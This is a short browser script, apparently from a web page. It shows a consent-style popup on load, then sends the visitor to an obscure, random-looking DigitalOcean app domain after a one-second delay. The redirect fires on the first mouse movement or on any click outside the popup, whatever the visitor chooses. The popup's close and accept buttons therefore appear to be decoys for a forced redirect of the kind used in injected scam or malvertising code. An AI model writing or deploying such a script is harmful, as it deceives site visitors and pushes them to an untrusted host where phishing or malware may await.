<script>
    // Get popup and close button elements
    var popup = document.getElementById('popup');
    var closePopup = document.getElementById('closePopup');
    var acceptBtn = document.getElementById('acceptBtn');
    var hasMovedOrClicked = false; // Flag to track if mouse has moved or clicked

    // Show the popup instantly after page load
    window.addEventListener('load', function() {
        popup.style.display = 'flex'; // Show popup
    });

    // Hide the popup when the close button is clicked
    closePopup.addEventListener('click', function(event) {
        event.preventDefault(); // Prevent default link behavior
        popup.style.display = 'none';
    });

    // Hide the popup when the accept button is clicked
    acceptBtn.addEventListener('click', function() {
        popup.style.display = 'none';
    });

    // Redirect to another page if the cursor is moved
    window.addEventListener('mousemove', function() {
        if (!hasMovedOrClicked) { // If neither the mouse has moved nor a click occurred
            hasMovedOrClicked = true; // Set the flag to true
            setTimeout(function() {
                window.location.href = 'https://charlskhdjsdkhasjsd-utarv.ondigitalocean.app/'; // Redirect to another page after movement
            }, 1000); // Optional delay before redirecting
        }
    });

    // Redirect to another page if the user clicks anywhere on the page (excluding the popup)
    window.addEventListener('click', function(event) {
        if (event.target !== popup && event.target !== popup.children[0]) {
            if (!hasMovedOrClicked) { // If neither the mouse has moved nor a click occurred
                hasMovedOrClicked = true; // Set the flag to true
                setTimeout(function() {
                    window.location.href = 'https://charlskhdjsdkhasjsd-utarv.ondigitalocean.app/'; // Redirect to another page after clicking
                }, 1000); // Optional delay before redirecting
            }
        }
    });

    // Hide the popup when clicking outside of the popup content
    window.addEventListener('click', function(event) {
        if (event.target === popup) {
            popup.style.display = 'none';
        }
    });
</script>
